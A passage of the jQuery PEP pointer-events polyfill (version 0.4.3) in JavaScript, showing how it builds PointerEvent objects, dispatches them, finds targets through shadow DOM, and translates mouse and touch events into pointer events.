/*!
 * PEP v0.4.3 | https://github.com/jquery/PEP
 * Copyright jQuery Foundation and other contributors | http://jquery.org/license
 */

(function (global, factory) {
  typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :
  typeof define === 'function' && define.amd ? define(factory) :
  (global.PointerEventsPolyfill = factory());
}(this, function () { 'use strict';

  /**
   * This is the constructor for new PointerEvents.
   *
   * New Pointer Events must be given a type, and an optional dictionary of
   * initialization properties.
   *
   * Due to certain platform requirements, events returned from the constructor
   * identify as MouseEvents.
   *
   * @constructor
   * @param {String} inType The type of the event to create.
   * @param {Object} [inDict] An optional dictionary of initial event properties.
   * @return {Event} A new PointerEvent of type `inType`, initialized with properties from `inDict`.
   */
  var MOUSE_PROPS = [
    'bubbles',
    'cancelable',
    'view',
    'detail',
    'screenX',
    'screenY',
    'clientX',
    'clientY',
    'ctrlKey',
    'altKey',
    'shiftKey',
    'metaKey',
    'button',
    'relatedTarget',
    'pageX',
    'pageY'
  ];

  var MOUSE_DEFAULTS = [
    false,
    false,
    null,
    null,
    0,
    0,
    0,
    0,
    false,
    false,
    false,
    false,
    0,
    null,
    0,
    0
  ];

  function PointerEvent(inType, inDict) {
    inDict = inDict || Object.create(null);

    var e = document.createEvent('Event');
    e.initEvent(inType, inDict.bubbles || false, inDict.cancelable || false);

    // define inherited MouseEvent properties
    // skip bubbles and cancelable since they're set above in initEvent()
    for (var i = 2, p; i < MOUSE_PROPS.length; i++) {
      p = MOUSE_PROPS[i];
      e[p] = inDict[p] || MOUSE_DEFAULTS[i];
    }
    e.buttons = inDict.buttons || 0;

    // Spec requires that pointers without pressure specified use 0.5 for down
    // state and 0 for up state.
    var pressure = 0;

    if (inDict.pressure && e.buttons) {
      pressure = inDict.pressure;
    } else {
      pressure = e.buttons ? 0.5 : 0;
    }

    // add x/y properties aliased to clientX/Y
    e.x = e.clientX;
    e.y = e.clientY;

    // define the properties of the PointerEvent interface
    e.pointerId = inDict.pointerId || 0;
    e.width = inDict.width || 0;
    e.height = inDict.height || 0;
    e.pressure = pressure;
    e.tiltX = inDict.tiltX || 0;
    e.tiltY = inDict.tiltY || 0;
    e.twist = inDict.twist || 0;
    e.tangentialPressure = inDict.tangentialPressure || 0;
    e.pointerType = inDict.pointerType || '';
    e.hwTimestamp = inDict.hwTimestamp || 0;
    e.isPrimary = inDict.isPrimary || false;
    return e;
  }

  /**
   * This module implements a map of pointer states
   */
  var USE_MAP = window.Map && window.Map.prototype.forEach;
  var PointerMap = USE_MAP ? Map : SparseArrayMap;

  function SparseArrayMap() {
    this.array = [];
    this.size = 0;
  }

  SparseArrayMap.prototype = {
    set: function(k, v) {
      if (v === undefined) {
        return this.delete(k);
      }
      if (!this.has(k)) {
        this.size++;
      }
      this.array[k] = v;
    },
    has: function(k) {
      return this.array[k] !== undefined;
    },
    delete: function(k) {
      if (this.has(k)) {
        delete this.array[k];
        this.size--;
      }
    },
    get: function(k) {
      return this.array[k];
    },
    clear: function() {
      this.array.length = 0;
      this.size = 0;
    },

    // return value, key, map
    forEach: function(callback, thisArg) {
      return this.array.forEach(function(v, k) {
        callback.call(thisArg, v, k, this);
      }, this);
    }
  };

  var CLONE_PROPS = [

    // MouseEvent
    'bubbles',
    'cancelable',
    'view',
    'detail',
    'screenX',
    'screenY',
    'clientX',
    'clientY',
    'ctrlKey',
    'altKey',
    'shiftKey',
    'metaKey',
    'button',
    'relatedTarget',

    // DOM Level 3
    'buttons',

    // PointerEvent
    'pointerId',
    'width',
    'height',
    'pressure',
    'tiltX',
    'tiltY',
    'pointerType',
    'hwTimestamp',
    'isPrimary',

    // event instance
    'type',
    'target',
    'currentTarget',
    'which',
    'pageX',
    'pageY',
    'timeStamp'
  ];

  var CLONE_DEFAULTS = [

    // MouseEvent
    false,
    false,
    null,
    null,
    0,
    0,
    0,
    0,
    false,
    false,
    false,
    false,
    0,
    null,

    // DOM Level 3
    0,

    // PointerEvent
    0,
    0,
    0,
    0,
    0,
    0,
    '',
    0,
    false,

    // event instance
    '',
    null,
    null,
    0,
    0,
    0,
    0
  ];

  var BOUNDARY_EVENTS = {
    'pointerover': 1,
    'pointerout': 1,
    'pointerenter': 1,
    'pointerleave': 1
  };

  var HAS_SVG_INSTANCE = (typeof SVGElementInstance !== 'undefined');

  /**
   * This module is for normalizing events. Mouse and Touch events will be
   * collected here, and fire PointerEvents that have the same semantics, no
   * matter the source.
   * Events fired:
   *   - pointerdown: a pointing is added
   *   - pointerup: a pointer is removed
   *   - pointermove: a pointer is moved
   *   - pointerover: a pointer crosses into an element
   *   - pointerout: a pointer leaves an element
   *   - pointercancel: a pointer will no longer generate events
   */
  var dispatcher = {
    pointermap: new PointerMap(),
    eventMap: Object.create(null),
    captureInfo: Object.create(null),

    // Scope objects for native events.
    // This exists for ease of testing.
    eventSources: Object.create(null),
    eventSourceList: [],
    /**
     * Add a new event source that will generate pointer events.
     *
     * `inSource` must contain an array of event names named `events`, and
     * functions with the names specified in the `events` array.
     * @param {string} name A name for the event source
     * @param {Object} source A new source of platform events.
     */
    registerSource: function(name, source) {
      var s = source;
      var newEvents = s.events;
      if (newEvents) {
        newEvents.forEach(function(e) {
          if (s[e]) {
            this.eventMap[e] = s[e].bind(s);
          }
        }, this);
        this.eventSources[name] = s;
        this.eventSourceList.push(s);
      }
    },
    register: function(element) {
      var l = this.eventSourceList.length;
      for (var i = 0, es; (i < l) && (es = this.eventSourceList[i]); i++) {

        // call eventsource register
        es.register.call(es, element);
      }
    },
    unregister: function(element) {
      var l = this.eventSourceList.length;
      for (var i = 0, es; (i < l) && (es = this.eventSourceList[i]); i++) {

        // call eventsource register
        es.unregister.call(es, element);
      }
    },
    contains: /*scope.external.contains || */function(container, contained) {
      try {
        return container.contains(contained);
      } catch (ex) {

        // most likely: https://bugzilla.mozilla.org/show_bug.cgi?id=208427
        return false;
      }
    },

    // EVENTS
    down: function(inEvent) {
      inEvent.bubbles = true;
      this.fireEvent('pointerdown', inEvent);
    },
    move: function(inEvent) {
      inEvent.bubbles = true;
      this.fireEvent('pointermove', inEvent);
    },
    up: function(inEvent) {
      inEvent.bubbles = true;
      this.fireEvent('pointerup', inEvent);
    },
    enter: function(inEvent) {
      inEvent.bubbles = false;
      this.fireEvent('pointerenter', inEvent);
    },
    leave: function(inEvent) {
      inEvent.bubbles = false;
      this.fireEvent('pointerleave', inEvent);
    },
    over: function(inEvent) {
      inEvent.bubbles = true;
      this.fireEvent('pointerover', inEvent);
    },
    out: function(inEvent) {
      inEvent.bubbles = true;
      this.fireEvent('pointerout', inEvent);
    },
    cancel: function(inEvent) {
      inEvent.bubbles = true;
      this.fireEvent('pointercancel', inEvent);
    },
    leaveOut: function(event) {
      this.out(event);
      this.propagate(event, this.leave, false);
    },
    enterOver: function(event) {
      this.over(event);
      this.propagate(event, this.enter, true);
    },

    // LISTENER LOGIC
    eventHandler: function(inEvent) {

      // This is used to prevent multiple dispatch of pointerevents from
      // platform events. This can happen when two elements in different scopes
      // are set up to create pointer events, which is relevant to Shadow DOM.
      if (inEvent._handledByPE) {
        return;
      }
      var type = inEvent.type;
      var fn = this.eventMap && this.eventMap[type];
      if (fn) {
        fn(inEvent);
      }
      inEvent._handledByPE = true;
    },

    // set up event listeners
    listen: function(target, events) {
      events.forEach(function(e) {
        this.addEvent(target, e);
      }, this);
    },

    // remove event listeners
    unlisten: function(target, events) {
      events.forEach(function(e) {
        this.removeEvent(target, e);
      }, this);
    },
    addEvent: /*scope.external.addEvent || */function(target, eventName) {
      target.addEventListener(eventName, this.boundHandler);
    },
    removeEvent: /*scope.external.removeEvent || */function(target, eventName) {
      target.removeEventListener(eventName, this.boundHandler);
    },

    // EVENT CREATION AND TRACKING
    /**
     * Creates a new Event of type `inType`, based on the information in
     * `inEvent`.
     *
     * @param {string} inType A string representing the type of event to create
     * @param {Event} inEvent A platform event with a target
     * @return {Event} A PointerEvent of type `inType`
     */
    makeEvent: function(inType, inEvent) {

      // relatedTarget must be null if pointer is captured
      if (this.captureInfo[inEvent.pointerId]) {
        inEvent.relatedTarget = null;
      }
      var e = new PointerEvent(inType, inEvent);
      if (inEvent.preventDefault) {
        e.preventDefault = inEvent.preventDefault;
      }
      e._target = e._target || inEvent.target;
      return e;
    },

    // make and dispatch an event in one call
    fireEvent: function(inType, inEvent) {
      var e = this.makeEvent(inType, inEvent);
      return this.dispatchEvent(e);
    },
    /**
     * Returns a snapshot of inEvent, with writable properties.
     *
     * @param {Event} inEvent An event that contains properties to copy.
     * @return {Object} An object containing shallow copies of `inEvent`'s
     *    properties.
     */
    cloneEvent: function(inEvent) {
      var eventCopy = Object.create(null);
      var p;
      for (var i = 0; i < CLONE_PROPS.length; i++) {
        p = CLONE_PROPS[i];
        eventCopy[p] = inEvent[p] || CLONE_DEFAULTS[i];

        // Work around SVGInstanceElement shadow tree
        // Return the <use> element that is represented by the instance for Safari, Chrome, IE.
        // This is the behavior implemented by Firefox.
        if (HAS_SVG_INSTANCE && (p === 'target' || p === 'relatedTarget')) {
          if (eventCopy[p] instanceof SVGElementInstance) {
            eventCopy[p] = eventCopy[p].correspondingUseElement;
          }
        }
      }

      // keep the semantics of preventDefault
      if (inEvent.preventDefault) {
        eventCopy.preventDefault = function() {
          inEvent.preventDefault();
        };
      }
      return eventCopy;
    },
    getTarget: function(inEvent) {
      var capture = this.captureInfo[inEvent.pointerId];
      if (!capture) {
        return inEvent._target;
      }
      if (inEvent._target === capture || !(inEvent.type in BOUNDARY_EVENTS)) {
        return capture;
      }
    },
    propagate: function(event, fn, propagateDown) {
      var target = event.target;
      var targets = [];

      // Order of conditions due to document.contains() missing in IE.
      while (target !== document && !target.contains(event.relatedTarget)) {
        targets.push(target);
        target = target.parentNode;

        // Touch: Do not propagate if node is detached.
        if (!target) {
          return;
        }
      }
      if (propagateDown) {
        targets.reverse();
      }
      targets.forEach(function(target) {
        event.target = target;
        fn.call(this, event);
      }, this);
    },
    setCapture: function(inPointerId, inTarget, skipDispatch) {
      if (this.captureInfo[inPointerId]) {
        this.releaseCapture(inPointerId, skipDispatch);
      }

      this.captureInfo[inPointerId] = inTarget;
      this.implicitRelease = this.releaseCapture.bind(this, inPointerId, skipDispatch);
      document.addEventListener('pointerup', this.implicitRelease);
      document.addEventListener('pointercancel', this.implicitRelease);

      var e = new PointerEvent('gotpointercapture');
      e.pointerId = inPointerId;
      e._target = inTarget;

      if (!skipDispatch) {
        this.asyncDispatchEvent(e);
      }
    },
    releaseCapture: function(inPointerId, skipDispatch) {
      var t = this.captureInfo[inPointerId];
      if (!t) {
        return;
      }

      this.captureInfo[inPointerId] = undefined;
      document.removeEventListener('pointerup', this.implicitRelease);
      document.removeEventListener('pointercancel', this.implicitRelease);

      var e = new PointerEvent('lostpointercapture');
      e.pointerId = inPointerId;
      e._target = t;

      if (!skipDispatch) {
        this.asyncDispatchEvent(e);
      }
    },
    /**
     * Dispatches the event to its target.
     *
     * @param {Event} inEvent The event to be dispatched.
     * @return {Boolean} True if an event handler returns true, false otherwise.
     */
    dispatchEvent: /*scope.external.dispatchEvent || */function(inEvent) {
      var t = this.getTarget(inEvent);
      if (t) {
        return t.dispatchEvent(inEvent);
      }
    },
    asyncDispatchEvent: function(inEvent) {
      requestAnimationFrame(this.dispatchEvent.bind(this, inEvent));
    }
  };
  dispatcher.boundHandler = dispatcher.eventHandler.bind(dispatcher);

  var targeting = {
    shadow: function(inEl) {
      if (inEl) {
        return inEl.shadowRoot || inEl.webkitShadowRoot;
      }
    },
    canTarget: function(shadow) {
      return shadow && Boolean(shadow.elementFromPoint);
    },
    targetingShadow: function(inEl) {
      var s = this.shadow(inEl);
      if (this.canTarget(s)) {
        return s;
      }
    },
    olderShadow: function(shadow) {
      var os = shadow.olderShadowRoot;
      if (!os) {
        var se = shadow.querySelector('shadow');
        if (se) {
          os = se.olderShadowRoot;
        }
      }
      return os;
    },
    allShadows: function(element) {
      var shadows = [];
      var s = this.shadow(element);
      while (s) {
        shadows.push(s);
        s = this.olderShadow(s);
      }
      return shadows;
    },
    searchRoot: function(inRoot, x, y) {
      if (inRoot) {
        var t = inRoot.elementFromPoint(x, y);
        var st, sr;

        // is element a shadow host?
        sr = this.targetingShadow(t);
        while (sr) {

          // find the the element inside the shadow root
          st = sr.elementFromPoint(x, y);
          if (!st) {

            // check for older shadows
            sr = this.olderShadow(sr);
          } else {

            // shadowed element may contain a shadow root
            var ssr = this.targetingShadow(st);
            return this.searchRoot(ssr, x, y) || st;
          }
        }

        // light dom element is the target
        return t;
      }
    },
    owner: function(element) {
      var s = element;

      // walk up until you hit the shadow root or document
      while (s.parentNode) {
        s = s.parentNode;
      }

      // the owner element is expected to be a Document or ShadowRoot
      if (s.nodeType !== Node.DOCUMENT_NODE && s.nodeType !== Node.DOCUMENT_FRAGMENT_NODE) {
        s = document;
      }
      return s;
    },
    findTarget: function(inEvent) {
      var x = inEvent.clientX;
      var y = inEvent.clientY;

      // if the listener is in the shadow root, it is much faster to start there
      var s = this.owner(inEvent.target);

      // if x, y is not in this root, fall back to document search
      if (!s.elementFromPoint(x, y)) {
        s = document;
      }
      return this.searchRoot(s, x, y);
    }
  };

  var forEach = Array.prototype.forEach.call.bind(Array.prototype.forEach);
  var map = Array.prototype.map.call.bind(Array.prototype.map);
  var toArray = Array.prototype.slice.call.bind(Array.prototype.slice);
  var filter = Array.prototype.filter.call.bind(Array.prototype.filter);
  var MO = window.MutationObserver || window.WebKitMutationObserver;
  var SELECTOR = '[touch-action]';
  var OBSERVER_INIT = {
    subtree: true,
    childList: true,
    attributes: true,
    attributeOldValue: true,
    attributeFilter: ['touch-action']
  };

  function Installer(add, remove, changed, binder) {
    this.addCallback = add.bind(binder);
    this.removeCallback = remove.bind(binder);
    this.changedCallback = changed.bind(binder);
    if (MO) {
      this.observer = new MO(this.mutationWatcher.bind(this));
    }
  }

  Installer.prototype = {
    watchSubtree: function(target) {

      // Only watch scopes that can target find, as these are top-level.
      // Otherwise we can see duplicate additions and removals that add noise.
      //
      // TODO(dfreedman): For some instances with ShadowDOMPolyfill, we can see
      // a removal without an insertion when a node is redistributed among
      // shadows. Since it all ends up correct in the document, watching only
      // the document will yield the correct mutations to watch.
      if (this.observer && targeting.canTarget(target)) {
        this.observer.observe(target, OBSERVER_INIT);
      }
    },
    enableOnSubtree: function(target) {
      this.watchSubtree(target);
      if (target === document && document.readyState !== 'complete') {
        this.installOnLoad();
      } else {
        this.installNewSubtree(target);
      }
    },
    installNewSubtree: function(target) {
      forEach(this.findElements(target), this.addElement, this);
    },
    findElements: function(target) {
      if (target.querySelectorAll) {
        return target.querySelectorAll(SELECTOR);
      }
      return [];
    },
    removeElement: function(el) {
      this.removeCallback(el);
    },
    addElement: function(el) {
      this.addCallback(el);
    },
    elementChanged: function(el, oldValue) {
      this.changedCallback(el, oldValue);
    },
    concatLists: function(accum, list) {
      return accum.concat(toArray(list));
    },

    // register all touch-action = none nodes on document load
    installOnLoad: function() {
      document.addEventListener('readystatechange', function() {
        if (document.readyState === 'complete') {
          this.installNewSubtree(document);
        }
      }.bind(this));
    },
    isElement: function(n) {
      return n.nodeType === Node.ELEMENT_NODE;
    },
    flattenMutationTree: function(inNodes) {

      // find children with touch-action
      var tree = map(inNodes, this.findElements, this);

      // make sure the added nodes are accounted for
      tree.push(filter(inNodes, this.isElement));

      // flatten the list
      return tree.reduce(this.concatLists, []);
    },
    mutationWatcher: function(mutations) {
      mutations.forEach(this.mutationHandler, this);
    },
    mutationHandler: function(m) {
      if (m.type === 'childList') {
        var added = this.flattenMutationTree(m.addedNodes);
        added.forEach(this.addElement, this);
        var removed = this.flattenMutationTree(m.removedNodes);
        removed.forEach(this.removeElement, this);
      } else if (m.type === 'attributes') {
        this.elementChanged(m.target, m.oldValue);
      }
    }
  };

  function shadowSelector(v) {
    return 'body /shadow-deep/ ' + selector(v);
  }
  function selector(v) {
    return '[touch-action="' + v + '"]';
  }
  function rule(v) {
    return '{ -ms-touch-action: ' + v + '; touch-action: ' + v + '; }';
  }
  var attrib2css = [
    'none',
    'auto',
    'pan-x',
    'pan-y',
    {
      rule: 'pan-x pan-y',
      selectors: [
        'pan-x pan-y',
        'pan-y pan-x'
      ]
    }
  ];
  var styles = '';

  // only install stylesheet if the browser has touch action support
  var hasNativePE = window.PointerEvent || window.MSPointerEvent;

  // only add shadow selectors if shadowdom is supported
  var hasShadowRoot = !window.ShadowDOMPolyfill && document.head.createShadowRoot;

  function applyAttributeStyles() {
    if (hasNativePE) {
      attrib2css.forEach(function(r) {
        if (String(r) === r) {
          styles += selector(r) + rule(r) + '\n';
          if (hasShadowRoot) {
            styles += shadowSelector(r) + rule(r) + '\n';
          }
        } else {
          styles += r.selectors.map(selector) + rule(r.rule) + '\n';
          if (hasShadowRoot) {
            styles += r.selectors.map(shadowSelector) + rule(r.rule) + '\n';
          }
        }
      });

      var el = document.createElement('style');
      el.textContent = styles;
      document.head.appendChild(el);
    }
  }

  var pointermap = dispatcher.pointermap;

  // radius around touchend that swallows mouse events
  var DEDUP_DIST = 25;

  // left, middle, right, back, forward
  var BUTTON_TO_BUTTONS = [1, 4, 2, 8, 16];

  var HAS_BUTTONS = false;
  try {
    HAS_BUTTONS = new MouseEvent('test', { buttons: 1 }).buttons === 1;
  } catch (e) {}

  // handler block for native mouse events
  var mouseEvents = {
    POINTER_ID: 1,
    POINTER_TYPE: 'mouse',
    events: [
      'mousedown',
      'mousemove',
      'mouseup',
      'mouseover',
      'mouseout'
    ],
    register: function(target) {
      dispatcher.listen(target, this.events);
    },
    unregister: function(target) {
      dispatcher.unlisten(target, this.events);
    },
    lastTouches: [],

    // collide with the global mouse listener
    isEventSimulatedFromTouch: function(inEvent) {
      var lts = this.lastTouches;
      var x = inEvent.clientX;
      var y = inEvent.clientY;
      for (var i = 0, l = lts.length, t; i < l && (t = lts[i]); i++) {

        // simulated mouse events will be swallowed near a primary touchend
        var dx = Math.abs(x - t.x);
        var dy = Math.abs(y - t.y);
        if (dx <= DEDUP_DIST && dy <= DEDUP_DIST) {
          return true;
        }
      }
    },
    prepareEvent: function(inEvent) {
      var e = dispatcher.cloneEvent(inEvent);

      // forward mouse preventDefault
      var pd = e.preventDefault;
      e.preventDefault = function() {
        inEvent.preventDefault();
        pd();
      };
      e.pointerId = this.POINTER_ID;
      e.isPrimary = true;
      e.pointerType = this.POINTER_TYPE;
      return e;
    },
    prepareButtonsForMove: function(e, inEvent) {
      var p = pointermap.get(this.POINTER_ID);

      // Update buttons state after possible out-of-document mouseup.
      if (inEvent.which === 0 || !p) {
        e.buttons = 0;
      } else {
        e.buttons = p.buttons;
      }
      inEvent.buttons = e.buttons;
    },
    mousedown: function(inEvent) {
      if (!this.isEventSimulatedFromTouch(inEvent)) {
        var p = pointermap.get(this.POINTER_ID);
        var e = this.prepareEvent(inEvent);
        if (!HAS_BUTTONS) {
          e.buttons = BUTTON_TO_BUTTONS[e.button];
          if (p) { e.buttons |= p.buttons; }
          inEvent.buttons = e.buttons;
        }
        pointermap.set(this.POINTER_ID, inEvent);
        if (!p || p.buttons === 0) {
          dispatcher.down(e);
        } else {
          dispatcher.move(e);
        }
      }
    },
    mousemove: function(inEvent) {
      if (!this.isEventSimulatedFromTouch(inEvent)) {
        var e = this.prepareEvent(inEvent);
        if (!HAS_BUTTONS) { this.prepareButtonsForMove(e, inEvent); }
        e.button = -1;
        pointermap.set(this.POINTER_ID, inEvent);
        dispatcher.move(e);
      }
    },
    mouseup: function(inEvent) {
      if (!this.isEventSimulatedFromTouch(inEvent)) {
        var p = pointermap.get(this.POINTER_ID);
        var e = this.prepareEvent(inEvent);
        if (!HAS_BUTTONS) {
          var up = BUTTON_TO_BUTTONS[e.button];

          // Produces wrong state of buttons in Browsers without `buttons` support
          // when a mouse button that was pressed outside the document is released
          // inside and other buttons are still pressed down.
          e.buttons = p ? p.buttons & ~up : 0;
          inEvent.buttons = e.buttons;
        }
        pointermap.set(this.POINTER_ID, inEvent);

        // Support: Firefox <=44 only
        // FF Ubuntu includes the lifted button in the `buttons` property on
        // mouseup.
        // https://bugzilla.mozilla.org/show_bug.cgi?id=1223366
        e.buttons &= ~BUTTON_TO_BUTTONS[e.button];
        if (e.buttons === 0) {
          dispatcher.up(e);
        } else {
          dispatcher.move(e);
        }
      }
    },
    mouseover: function(inEvent) {
      if (!this.isEventSimulatedFromTouch(inEvent)) {
        var e = this.prepareEvent(inEvent);
        if (!HAS_BUTTONS) { this.prepareButtonsForMove(e, inEvent); }
        e.button = -1;
        pointermap.set(this.POINTER_ID, inEvent);
        dispatcher.enterOver(e);
      }
    },
    mouseout: function(inEvent) {
      if (!this.isEventSimulatedFromTouch(inEvent)) {
        var e = this.prepareEvent(inEvent);
        if (!HAS_BUTTONS) { this.prepareButtonsForMove(e, inEvent); }
        e.button = -1;
        dispatcher.leaveOut(e);
      }
    },
    cancel: function(inEvent) {
      var e = this.prepareEvent(inEvent);
      dispatcher.cancel(e);
      this.deactivateMouse();
    },
    deactivateMouse: function() {
      pointermap.delete(this.POINTER_ID);
    }
  };

  var captureInfo = dispatcher.captureInfo;
  var findTarget = targeting.findTarget.bind(targeting);
  var allShadows = targeting.allShadows.bind(targeting);
  var pointermap$1 = dispatcher.pointermap;

  // This should be long enough to ignore compat mouse events made by touch
  var DEDUP_TIMEOUT = 2500;
  var CLICK_COUNT_TIMEOUT = 200;
  var ATTRIB = 'touch-action';
  var INSTALLER;

  // handler block for native touch events
  var touchEvents = {
    events: [
      'touchstart',
      'touchmove',
      'touchend',
      'touchcancel'
    ],
    register: function(target) {
      INSTALLER.enableOnSubtree(target);
    },
    unregister: function() {

      // TODO(dfreedman): is it worth it to disconnect the MO?
    },
    elementAdded: function(el) {
      var a = el.getAttribute(ATTRIB);
      var st = this.touchActionToScrollType(a);
      if (st) {
        el._scrollType = st;
        dispatcher.listen(el, this.events);

        // set touch-action on shadows as well
        allShadows(el).forEach(function(s) {
          s._scrollType = st;
          dispatcher.listen(s, this.events);
        }, this);
      }
    },
    elementRemoved: function(el) {
      el._scrollType = undefined;
      dispatcher.unlisten(el, this.events);

      // remove touch-action from shadow
      allShadows(el).forEach(function(s) {
        s._scrollType = undefined;
        dispatcher.unlisten(s, this.events);
      }, this);
    },
    elementChanged: function(el, oldValue) {
      var a = el.getAttribute(ATTRIB);
      var st = this.touchActionToScrollType(a);
      var oldSt = this.touchActionToScrollType(oldValue);

      // simply update scrollType if listeners are already established
      if (st && oldSt) {
        el._scrollType = st;
        allShadows(el).forEach(function(s) {
          s._scrollType = st;
        }, this);
      } else if (oldSt) {
        this.elementRemoved(el);
      } else if (st) {
        this.elementAdded(el);
      }
    },
    scrollTypes: {
      EMITTER: 'none',
      XSCROLLER: 'pan-x',
      YSCROLLER: 'pan-y',
      SCROLLER: /^(?:pan-x pan-y)|(?:pan-y pan-x)|auto$/
    },
    touchActionToScrollType: function(touchAction) {
      var t = touchAction;
      var st = this.scrollTypes;
      if (t === 'none') {
        return 'none';
      } else if (t === st.XSCROLLER) {
        return 'X';
      } else if (t === st.YSCROLLER) {
        return 'Y';
      } else if (st.SCROLLER.exec(t)) {
        return 'XY';
      }
    },
    POINTER_TYPE: 'touch',
    firstTouch: null,
    isPrimaryTouch: function(inTouch) {
      return this.firstTouch === inTouch.identifier;
    },
    setPrimaryTouch: function(inTouch) {

      // set primary touch if there no pointers, or the only pointer is the mouse
      if (pointermap$1.size === 0 || (pointermap$1.size === 1 && pointermap$1.has(1))) {
        this.firstTouch = inTouch.identifier;
        this.firstXY = { X: inTouch.clientX, Y: inTouch.clientY };
        this.scrolling = false;
        this.cancelResetClickCount();
      }
    },
    removePrimaryPointer: function(inPointer) {
      if (inPointer.isPrimary) {
        this.firstTouch = null;
        this.firstXY = null;
        this.resetClickCount();
      }
    },
    clickCount: 0,
    resetId: null,
    resetClickCount: function() {
      var fn = function() {
        this.clickCount = 0;
        this.resetId = null;
      }.bind(this);
      this.resetId = setTimeout(fn, CLICK_COUNT_TIMEOUT);
    },
    cancelResetClickCount: function() {
      if (this.resetId) {
        clearTimeout(this.resetId);
      }
    },
    typeToButtons: function(type) {
      var ret = 0;
      if (type === 'touchstart' || type === 'touchmove') {
        ret = 1;
      }
      return ret;
    },
    touchToPointer: function(inTouch) {
      var cte = this.currentTouchEvent;
      var e = dispatcher.cloneEvent(inTouch);

      // We reserve pointerId 1 for Mouse.
      // Touch identifiers can start at 0.
      // Add 2 to the touch identifier for compatibility.
      var id = e.pointerId = inTouch.identifier + 2;
      e.target = captureInfo[id] || findTarget(e);
      e.bubbles = true;
      e.cancelable = true;
      e.detail = this.clickCount;
      e.button = 0;
      e.buttons = this.typeToButtons(cte.type);
      e.width = (inTouch.radiusX || inTouch.webkitRadiusX || 0) * 2;
      e.height = (inTouch.radiusY || inTouch.webkitRadiusY || 0) * 2;
      e.pressure = inTouch.force || inTouch.webkitForce || 0.5;
      e.isPrimary = this.isPrimaryTouch(inTouch);
      e.pointerType = this.POINTER_TYPE;

      // forward modifier keys
      e.altKey = cte.altKey;
      e.ctrlKey = cte.ctrlKey;
      e.metaKey = cte.metaKey;
      e.shiftKey = cte.shiftKey;

      // forward touch preventDefaults
      var self = this;
      e.preventDefault = function() {
        self.scrolling = false;
        self.firstXY = null;
        cte.preventDefault();
      };
      return e;
    },
    processTouches: function(inEvent, inFunction) {
      var tl = inEvent.changedTouches;
      this.currentTouchEvent = inEvent;
      for (var i = 0, t; i < tl.length; i++) {
        t = tl[i];
        inFunction.call(this, this.touchToPointer(t));
      }
    },

    // For single axis scrollers, determines whether the element should emit
    // pointer events or behave as a scroller
    shouldScroll: function(inEvent) {
      if (this.firstXY) {
        var ret;
        var scrollAxis = inEvent.currentTarget._scrollType;
        if (scrollAxis === 'none') {

          // this element is a touch-action: none, should never scroll
          ret = false;
        } else if (scrollAxis === 'XY') {

          // this element should always scroll
          ret = true;
        } else {
          var t = inEvent.changedTouches[0];

          // check the intended scroll axis, and other axis
          var a = scrollAxis;
          var oa = scrollAxis === 'Y' ? 'X' : 'Y';
          var da = Math.abs(t['client' + a] - this.firstXY[a]);
          var doa = Math.abs(t['client' + oa] - this.firstXY[oa]);

          // if delta in the scroll axis > delta other axis, scroll instead of
          // making events
          ret = da >= doa;
        }
        this.firstXY = null;
        return ret;
      }
    },
    findTouch: function(inTL, inId) {
      for (var i = 0, l = inTL.length, t; i < l && (t = inTL[i]); i++) {
        if (t.identifier === inId) {
          return true;
        }
      }
    },

    // In some instances, a touchstart can happen without a touchend. This
    // leaves the pointermap in a broken state.
    // Therefore, on every touchstart, we remove the touches that did not fire a
    // touchend event.
    // To keep state globally consistent, we fire a
    // pointercancel for this "abandoned" touch
    vacuumTouches: function(inEvent) {
      var tl = inEvent.touches;

      // pointermap.size should be < tl.length here, as the touchstart has not
      // been processed yet.
      if (pointermap$1.size >= tl.length) {
        var d = [];
        pointermap$1.forEach(function(value, key) {

          // Never remove pointerId == 1, which is mouse.
          // Touch identifiers are 2 smaller than their pointerId, which is the
          // index in pointermap.
          if (key !== 1 && !this.findTouch(tl, key - 2)) {
            var p = value.out;
            d.push(p);
          }
        }, this);
        d.forEach(this.cancelOut, this);
      }
    },
    touchstart: function(inEvent) {
      this.vacuumTouches(inEvent);
      this.setPrimaryTouch(inEvent.changedTouches[0]);
      this.dedupSynthMouse(inEvent);
      if (!this.scrolling) {
        this.clickCount++;
        this.processTouches(inEvent, this.overDown);
      }
    },
    overDown: function(inPointer) {
      pointermap$1.set(inPointer.pointerId, {
        target: inPointer.target,
        out: inPointer,
        outTarget: inPointer.target
      });
      dispatcher.enterOver(inPointer);
      dispatcher.down(inPointer);
    },
    touchmove: function(inEvent) {
      if (!this.scrolling) {
        if (this.shouldScroll(inEvent)) {
          this.scrolling = true;
          this.touchcancel(inEvent);
        } else {
          inEvent.preventDefault();
          this.processTouches(inEvent, this.moveOverOut);
        }
      }
    },
    moveOverOut: function(inPointer) {
      var event = inPointer;
      var pointer = pointermap$1.get(event.pointerId);

      // a finger drifted off the screen, ignore it
      if (!pointer) {
        return;
      }
      var outEvent = pointer.out;
      var outTarget = pointer.outTarget;
      dispatcher.move(event);
      if (outEvent && outTarget !== event.target) {
        outEvent.relatedTarget = event.target;
        event.relatedTarget = outTarget;

        // recover from retargeting by shadow
        outEvent.target = outTarget;
        if (event.target) {
          dispatcher.leaveOut(outEvent);
          dispatcher.enterOver(event);
        } else {

          // clean up case when finger leaves the screen
          event.target = outTarget;
          event.relatedTarget = null;
          this.cancelOut(event);
        }
      }
      pointer.out = event;
      pointer.outTarget = event.target;
    },
    touchend: function(inEvent) {
      this.dedupSynthMouse(inEvent);
      this.processTouches(inEvent, this.upOut);
    },
    upOut: function(inPointer) {
      if (!this.scrolling) {
        dispatcher.up(inPointer);
        dispatcher.leaveOut(inPointer);
      }
      this.cleanUpPointer(inPointer);
    },
    touchcancel: function(inEvent) {
      this.processTouches(inEvent, this.cancelOut);
    },
    cancelOut: function(inPointer) {
      dispatcher.cancel(inPointer);
      dispatcher.leaveOut(inPointer);
      this.cleanUpPointer(inPointer);
    },
    cleanUpPointer: function(inPointer) {
      pointermap$1.delete(inPointer.pointerId);
      this.removePrimaryPointer(inPointer);
    },

    // prevent synth mouse events from creating pointer events
    dedupSynthMouse: function(inEvent) {
      var lts = mouseEvents.lastTouches;
      var t = inEvent.changedTouches[0];

      // only the primary finger will synth mouse events
      if (this.isPrimaryTouch(t)) {

        // remember x/y of last touch
        var lt = { x: t.clientX, y: t.clientY };
        lts.push(lt);
        var fn = (function(lts, lt) {
          var i = lts.indexOf(lt);
          if (i > -1) {
            lts.splice(i, 1);
          }
        }).bind(null, lts, lt);
        setTimeout(fn, DEDUP_TIMEOUT);
      }
    }
  };

